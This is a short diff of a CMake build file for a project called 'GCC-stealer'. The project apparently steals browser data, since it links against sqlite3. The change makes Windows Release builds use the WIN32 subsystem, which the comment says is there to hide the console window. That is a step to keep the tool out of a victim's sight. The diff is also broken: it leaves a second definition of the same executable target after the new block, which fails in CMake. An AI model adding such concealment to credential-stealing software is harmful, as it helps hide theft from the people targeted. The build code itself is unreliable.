@@ -12,6 +12,13 @@ set(GCC-stealer_SOURCE_FILES
     src/GCC-stealer.cpp
 )
 
+if((${CMAKE_SYSTEM_NAME} MATCHES "Windows") AND (${CMAKE_BUILD_TYPE} MATCHES "Release"))
+    #WIN32 option to hide console: https://cmake.org/pipermail/cmake/2003-July/004047.html
+	add_executable(GCC-stealer WIN32 ${GCC-stealer_SOURCE_FILES})
+else()
+	add_executable(GCC-stealer ${GCC-stealer_SOURCE_FILES})
+endif()
+
 add_executable(GCC-stealer ${GCC-stealer_SOURCE_FILES})
 
 target_link_libraries(GCC-stealer PRIVATE sqlite3)
